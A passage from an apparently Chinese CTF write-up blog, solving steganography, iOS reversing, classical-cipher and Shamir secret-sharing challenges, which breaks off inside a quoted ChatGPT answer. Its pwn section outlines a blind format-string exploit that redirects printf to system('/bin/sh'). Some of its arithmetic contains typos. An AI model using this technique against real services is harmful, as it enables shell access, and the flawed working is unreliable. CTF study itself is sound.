id="太简单了">太简单了</h3><p>解压压缩包，里面这有个没有尾缀名的<code>flag</code>文件，老规矩，<code>file</code>一下看看是什么文件，是个<code>zip</code>压缩包，直接加上为尾缀名，解压</p><p><img src="https://ae01.alicdn.com/kf/HTB1Jn5laBWD3KVjSZKP761p7FXaW.png" alt=""></p><p>解压不了，提示文件损坏。直接扔winhex，发现文件头被改了，直接改回来</p><p><img src="https://ae01.alicdn.com/kf/HTB1iSX_Xkxz61VjSZFr760eLFXaJ.png" alt=""></p><h3 id="Txt">Txt:</h3><p>下载下来是一个txt文件，但是复制的时候好像有点问题</p><p>打开winhex下查看，发现隐藏了一些东西。</p><p>谷歌zero-width，找到原题：</p><p><code>https://rawsec.ml/en/HackIT-2018-write-ups/</code></p><p><img src="https://ae01.alicdn.com/kf/HTB10ECkaBiE3KVjSZFM762QhVXao.png" alt=""></p><p>在wirteup部分找到解密的链接，复制文本里的内容直接解密得到flag</p><p><code>https://offdev.net/demos/zwsp-steg-js</code></p><p><img src="https://ae01.alicdn.com/kf/HTB12ZmkaEGF3KVjSZFm762qPXXa7.png" alt=""></p><h2 id="Pwn">Pwn</h2><h3 id="format">format</h3><blockquote><p>格式化字符串盲打 通过printf的函数地址确定libc基址，从而获得system地址。<br>send字符串“/bin/sh;”，那么在调用printf(“/bin/sh;”)的时候实际上调用的是system(“/bin/sh;”)，<br>通过格式化字符串漏洞达到任意读和任意写功能通过使其泄露信息从而实现目的。</p></blockquote><p><img src="https://ae01.alicdn.com/kf/HTB1aYOmaBSD3KVjSZFq7634bpXaT.png" alt=""></p><p><img src="https://ae01.alicdn.com/kf/HTB1Vy1kaEGF3KVjSZFv762_nXXaI.png" alt=""></p><h2 id="MOBILE">MOBILE</h2><h3 id="IOS-200">IOS_200</h3><blockquote><p>题目描述：IOS送分题</p></blockquote><p>压缩包下载下来解压，先file一下看看，发现里面的【UnlockMyIphone】是64位的app文件。</p><p><img src="https://ae01.alicdn.com/kf/HTB1wnmjav5G3KVjSZPx762I3XXaS.png" alt=""></p><p>直接扔进IDA，搜索一波flag，key之类的关键字，搜到一串私钥，仔细看，发现这是不需要密钥就可以解密的。</p><p><img src="https://ae01.alicdn.com/kf/HTB19RR_Xkxz61VjSZFt761DSVXaJ.png" alt=""></p><p>私钥后面跟着两串类似加密的字符串，不管那多，把私钥和这两串文本复制出来先。</p><p><img src="https://ae01.alicdn.com/kf/HTB1FHSqaBGw3KVjSZFw762Q2FXae.png" alt="0x31.png"></p><p>百度 在线rsa加密解密，找到以下站点进行解密（这里好像有个小坑，百度出来的前三个站点解不了，不知什么情况）</p><p><img src="https://ae01.alicdn.com/kf/HTB1HuyqaBKw3KVjSZFO761rDVXaT.png" alt=""></p><h2 id="BASIC">BASIC:</h2><h3 id="Her-Majesty-Queen-Elizabeth-II">Her Majesty Queen Elizabeth II:</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">FE&amp;pd8dMFLR%)(DsGbhi@/dKPNR&#x27;*TUm?\tlr.7RV<br></code></pre></td></tr></table></figure><p>直接base92解码拿到flag</p><p><img src="https://ae01.alicdn.com/kf/HTB14vKqaBKw3KVjSZTE763uRpXaK.png" alt=""></p><h2 id="真—签到题">真—签到题:</h2><p>关注公众号拿flag</p><h2 id="Crypto">Crypto:</h2><h3 id="维吉尼亚遇上困难">维吉尼亚遇上困难:</h3><p>这一段应该是维吉尼亚密码</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">BZGTNPMMCGZFPUWJCUIGRWXPFNLHZCKOAPGLKYJNRAQFIUYRAVGNPANUMDQOAHMWTGJDXGOMPJPTKAAVZIUIWKVTUCWBWNFWDFUMPJWPMQGPTNWXTSDPLPMWJAXUHHXWPFXXGVAPFNTXVFKOYIRBOQJHCBVWVFYCGQFGUSUBDWVIYATJGTBNDKGHCTMTWIUEFJITVUGJHHIMUVJICUWYQWYGGUWPUUCWIFGWUANILKPHDKOSPJTTWJQOJHXLBJAPZHVQWPDYPGLLGDBCHTGIZCCMEGVIIJLIFFBHSMEGUJHRXBOQUBDNASPEUCWNGWSNWXTSDPLPMWJAIUHUMWPSYCTUWFBMIAMKVBNTDMQNBVDKILQSSDYVWVXIGDQFIBHSLEAVDBXGOLGDBCHTGIZVNFQFKTNGRWXUDCTGKWCOXIXKZPPFDZGXNBAXLGGWBLTLWCKOXAR<br></code></pre></td></tr></table></figure><p>直接搜索找到解密网址</p><p><code>https://guballa.de/vigenere-solver</code></p><p><img src="https://ae01.alicdn.com/kf/Hfe537524fb7747ab9da36207a896ceedj.png" alt=""></p><h3 id="Shamir重要数据损坏">Shamir重要数据损坏</h3><blockquote><p>某集团总裁Shamir将自己使用的笔记本电脑上重要的秘密数据分割成5份子秘密数据，并分别存放在5个存储设备上，其中可以由至少3份子秘密数据联合参与运算，才能重构原来的秘密数据。分割方案使用的参数模数为5987。由于Shamir使用的笔记本电脑感染病毒致使该重要秘密数据损坏无法修复，于是Shamir让技术人员通过存放在编号为5、7、9的三个存储设备的子秘密数据进行重构重要秘密数据，其中编号5的存储设备存放的数据为（5,2258）、编号为7的存储设备存放的数据为（7,2424）、编号为9的存储设备存放的数据为（9,2630）。请问技术人员重构出来的重要秘密数据是多少？</p></blockquote><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text"> 1  5  25<br>A = 1  7  49<br> 1  9  81<br></code></pre></td></tr></table></figure><p>由矩形对应</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">a11 a12 a13<br>a21 a22 a23<br>a31 a32 a331<br></code></pre></td></tr></table></figure><p>由矩阵A得</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">|A|=a11*a22*a33+a12*a23*a31+a13*a21*a32-a13*a22*a31-a12*a21*a33-a11*a23*a32=16<br></code></pre></td></tr></table></figure><p>计算出矩阵A的伴随矩阵</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs text">A11=a22 * a33 - a23 * a32=7*81-9*49=126<br>A12= -a21 * a33 + a23 * a31=-1*81+1*49=-32<br>A13= a21 * a32 - a22 * a31=1*9-1*7=2<br>A21= -a12 * a33 + a13 * a32=-5*81+25*9=-180<br>A22=a11*a33-a31*a13=1*81-1*25=56<br>A23=-a11*a32+a31*a13=-1*9+1*5=-4<br>A31=a12*a23-a22*a13=5*49-7*25=70<br>A32=-a11*a33+a21*13=-1*49+1*25=-24<br>A33=a11*a22-a21*a12=1*7-1*5=2<br></code></pre></td></tr></table></figure><p>所以伴随矩阵得：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs text">A11  A21  A31<br>A12  A22  A32<br>A13  A23  A33<br><br>A11  A21 A31         126/16     -180/16   70/16          7.875  -11.25   4.375<br>A*=16/1A12  A22 A32    =    -32/16       56/16   -24/16   =   -2     3.5      -1.5<br>A13  A23 A33          2/16       -4/16      2/16         0.125  -0.25    0.125<br><br>2258x7.875-2424x11.25+2530x4.375=2018 <br></code></pre></td></tr></table></figure><h4 id="ChaGPT的回答">ChaGPT的回答</h4><p>这是一个使用 Shamir’s Secret Sharing Scheme 进行秘密数据重构的问题。Shamir’s Secret Sharing Scheme 是一种秘密共享方法，它通过将秘密拆分为多个部分，然后至少需要其中一部分来重构原始秘密。</p><p>在这个问题中，三个存储设备的数据为（5,2258）、（7,2424）、（9,2630）。每个数据包含两个值，一个是存储设备的编号，另一个是对应的子秘密数据。</p><p>Shamir’s Secret Sharing Scheme 的公式如下：</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>a</mi><mn>0</mn></msub><mo>+</mo><msub><mi>a</mi><mn>1</mn></msub><mi>x</mi><mo>+</mo><msub><mi>a</mi><mn>2</mn></msub><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mo>…</mo><mo>+</mo><msub><mi>a</mi><mrow><mi>t</mi><mo>−</mo><mn>1</mn></mrow></msub><msup><mi>x</mi><mrow><mi>t</mi><mo>−</mo><mn>1</mn></mrow></msup><mo>+</mo><msub><mi>a</mi><mi>t</mi></msub><msup><mi>x</mi><mi>t</mi></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">f(x) = a_0 + a_1x + a_2x^2 + \ldots + a_{t-1}x^{t-1} + a_tx^t \mod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0141em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0724em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.9936em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8436em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span></span></span></span></span></p><p>其中，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span> 是参数模数（在这个问题中为5987），<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">t</span></span></span></span> 是阈值，$a_0, a_1, \ldots, a_t $ 是秘密数据的系数。</p><p>在这个问题中，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mo>=</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">t = 2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span>，因为需要至少三个设备来重构原始秘密数据。我们有三个点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>5</mn><mo separator="true">,</mo><mn>2258</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(5,2258)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2258</span><span class="mclose">)</span></span></span></span>、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>7</mn><mo separator="true">,</mo><mn>2424</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(7,2424)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2424</span><span class="mclose">)</span></span></span></span> 和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>9</mn><mo separator="true">,</mo><mn>2630</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(9,2630)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">9</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2630</span><span class="mclose">)</span></span></span></span>。</p><p>现在，我们可以使用拉格朗日插值法来找到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mn>0</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord">0</span><span class="mclose">)</span></span></span></span>，即 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">x=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 时的函数值，这个值就是原始秘密数据。拉格朗日插值法的公式如下：</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mn>0</mn><mo stretchy="false">)</mo><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>t</mi></munderover><msub><mi>y</mi><mi>i</mi></msub><munderover><mo>∏</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn><mo separator="true">,</mo><mi>j</mi><mo mathvariant="normal">≠</mo><mi>i</mi></mrow><mi>t</mi></munderover><mfrac><msub><mi>x</mi><mi>j</mi></msub><mrow><msub><mi>x</mi><mi>j</mi></msub><mo>−</mo><msub><mi>x</mi><mi>i</mi></msub></mrow></mfrac><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">f(0) = \sum_{i=1}^{t} y_i \prod_{j=1,j\neq i}^{t} \frac{x_j}{x_j - x_i} \mod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord">0</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:3.2188em;vertical-align:-1.4382em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.7806em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.7806em;"><span style="top:-1.8479em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight"><span class="mrel mtight"><span class="mord vbox mtight"><span class="thinbox mtight"><span class="rlap mtight"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="inner"><span class="mord mtight"><span class="mrel mtight"></span></span></span><span class="fix"></span></span></span></span></span><span class="mrel mtight">=</span></span><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∏</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4382em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1076em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9721em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span></span></span></span></span></p><p>其中，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>y</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x_i, y_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> 是每个点的坐标。在这个问题中，我们有：</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left right left" columnspacing="0em 1em 0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><msub><mi>x</mi><mn>1</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mn>5</mn><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><msub><mi>y</mi><mn>1</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mn>2258</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><msub><mi>x</mi><mn>2</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mn>7</mn><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><msub><mi>y</mi><mn>2</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mn>2424</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><msub><mi>x</mi><mn>3</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mn>9</mn><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><msub><mi>y</mi><mn>3</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mn>2630</mn></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{align*}x_1 &amp;= 5, &amp; y_1 &amp;= 2258 \\x_2 &amp;= 7, &amp; y_2 &amp;= 2424 \\x_3 &amp;= 9, &amp; y_3 &amp;= 2630 \\\end{align*}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:4.5em;vertical-align:-2em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.5em;"><span style="top:-4.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t 